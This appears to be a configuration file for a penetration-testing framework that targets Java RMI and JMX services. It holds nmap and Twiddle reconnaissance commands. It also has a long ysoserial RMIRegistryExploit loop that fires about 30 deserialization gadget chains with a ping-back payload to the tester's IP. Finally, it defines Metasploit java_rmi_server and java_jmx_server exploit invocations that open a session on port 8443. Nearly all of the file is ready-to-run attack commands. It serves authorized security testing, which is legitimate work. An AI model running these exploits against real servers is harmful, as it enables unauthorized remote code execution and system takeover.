[general]
tools_categories = fingerprinting, deserialize, code_execution


#########################################################################################
# Fingerprinting
#########################################################################################
[usemulti_nmap_rmi_recon]
name = nmap_rmi_recon_script
tool_ref_name = nmap
category = fingerprinting
description = Nmap RMI scripts for reconnaissance
command = nmap -sV -Pn -vv -p [PORT] --script='rmi-*' -oN [OUTPUT] [IP]

[tool_twiddle]
name = twiddle
category = fingerprinting
description = Standalone version of the CLI based JMX tool Twiddle by JBoss
command = ./bin/twiddle.sh -v --host=[IP] --port=[PORT] serverinfo -d -c -l 2>&1 | tee [OUTPUT] && ./bin/twiddle.sh -v --host=[IP] --port=[PORT] get "jboss.system:type=ServerInfo" 2>&1 | tee [OUTPUT]
install = git clone https://github.com/swesource/twiddle-standalone.git .
update = git pull
jmx_specific = True


#########################################################################################
# Deserialize
#########################################################################################
#
#  Ysoserial Available payload types:
#     Payload             Authors                     Dependencies 
#     -------             -------                     ------------
#     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
#     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
#     Clojure             @JackOfMostTrades           clojure:1.8.0                    
#     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
#     CommonsCollections1 @frohoff                    commons-collections:3.1
#     CommonsCollections2 @frohoff                    commons-collections4:4.0
#     CommonsCollections3 @frohoff                    commons-collections:3.1
#     CommonsCollections4 @frohoff                    commons-collections4:4.0
#     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
#     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
#     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
#     Groovy1             @frohoff                    groovy:2.3.9
#     Hibernate1          @mbechler
#     Hibernate2          @mbechler
#     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
#     JRMPClient          @mbechler
#     JRMPListener        @mbechler
#     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
#     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
#     Jdk7u21             @frohoff
#     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
#     MozillaRhino1       @matthias_kaiser            js:1.7R2
#     Myfaces1            @mbechler
#     Myfaces2            @mbechler
#     ROME                @mbechler                   rome:1.0
#     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
#     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                           
#     URLDNS              @gebl
#     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
#         
[usemulti_ysoserial_rmiregistry]
name = ysoserial_rmiregistry
tool_ref_name = ysoserial
category = deserialize
description = Check for Java deserialize vulnerability. !! IMPORTANT !!: Run "sudo tcpdump icmp" in parallel to check if command is executed by the server
command = java -jar ysoserial-master-SNAPSHOT.jar; LOCAL_IP=`ip -4 addr show eth0 | grep -oP "(?<=inet ).*(?=/)"`; echo 'BeanShell1:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] BeanShell1 "/bin/ping -c 4 $LOCAL_IP"; echo 'C3P0:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] C3P0 "/bin/ping -c 4 $LOCAL_IP"; echo 'Clojure:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Clojure "/bin/ping -c 4 $LOCAL_IP"; echo 'CommonsBeanutils1:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsBeanutils1 "/bin/ping -c 4 $LOCAL_IP"; echo 'CommonsCollections1:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections1  "/bin/ping -c 4 $LOCAL_IP"; echo 'CommonsCollections2:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections2 "/bin/ping -c 4 $LOCAL_IP"; echo 'CommonsCollections3:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections3 "/bin/ping -c 4 $LOCAL_IP"; echo 'CommonsCollections4:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections4 "/bin/ping -c 4 $LOCAL_IP"; echo 'CommonsCollections5:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections5 "/bin/ping -c 4 $LOCAL_IP"; echo 'CommonsCollections6:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] CommonsCollections6 "/bin/ping -c 4 $LOCAL_IP"; echo 'FileUpload1:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] FileUpload1 "/bin/ping -c 4 $LOCAL_IP"; echo 'Groovy1:';java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Groovy1 "/bin/ping -c 4 $LOCAL_IP"; echo 'Hibernate1:';java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Hibernate1 "/bin/ping -c 4 $LOCAL_IP"; echo 'Hibernate2:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Hibernate2 "/bin/ping -c 4 $LOCAL_IP"; echo 'JBossInterceptors1:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] JBossInterceptors1 "/bin/ping -c 4 $LOCAL_IP"; echo 'JRMPClient:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] JRMPClient "/bin/ping -c 4 $LOCAL_IP"; echo 'JRMPListener:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] JRMPListener "/bin/ping -c 4 $LOCAL_IP"; echo 'JSON1:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] JSON1 "/bin/ping -c 4 $LOCAL_IP"; echo 'JavassistWeld1:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] JavassistWeld1 "/bin/ping -c 4 $LOCAL_IP"; echo 'Jdk7u21:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Jdk7u21 "/bin/ping -c 4 $LOCAL_IP"; echo 'Jython1:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Jython1 "/bin/ping -c 4 $LOCAL_IP"; echo 'MozillaRhino1:';java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] MozillaRhino1 "/bin/ping -c 4 $LOCAL_IP"; echo 'MyFaces1:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] MyFaces1 "/bin/ping -c 4 $LOCAL_IP"; echo 'MyFaces2:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] MyFaces2 "/bin/ping -c 4 $LOCAL_IP"; echo 'ROME:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] ROME "/bin/ping -c 4 $LOCAL_IP"; echo 'Spring1:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Spring1 "/bin/ping -c 4 $LOCAL_IP"; echo 'Spring2:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Spring2 "/bin/ping -c 4 $LOCAL_IP"; echo 'URLDNS:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] URLDNS "/bin/ping -c 4 $LOCAL_IP"; echo 'Wicket1:'; java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit [IP] [PORT] Wicket1 "/bin/ping -c 4 $LOCAL_IP"; 


#########################################################################################
# Code execution
#########################################################################################
[usemulti_msf_java_rmi_server]
name = MSF_java_rmi_server
tool_ref_name = metasploit
category = code_execution
description = Metasploit module - exploit/multi/misc/java_rmi_server - Takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL.
command = sudo msfconsole -x "use exploit/multi/misc/java_rmi_server; set RHOST [HOST]; set RPORT [PORT]; set VERBOSE true; set LPORT 8443; exploit; exit"

[usemulti_msf_java_jmx_server]
name = MSF_java_jmx_server
tool_ref_name = metasploit
category = code_execution
description = Metasploit module - exploit/multi/misc/java_jmx_server - JMX interfaces with authentication disabled (com.sun.management.jmxremote.authenticate=false) should be vulnerable and interfaces with authentication enabled will be vulnerable only if a weak configuration is deployed (allowing to use javax.management.loading.MLet, having a security manager allowing to load a ClassLoader MBean, etc.)
command = sudo msfconsole -x "use exploit/multi/misc/java_jmx_server; set RHOST [HOST]; set RPORT [PORT]; set VERBOSE true; set LPORT 8443; exploit; exit"
jmx_specific = True


# Add MJet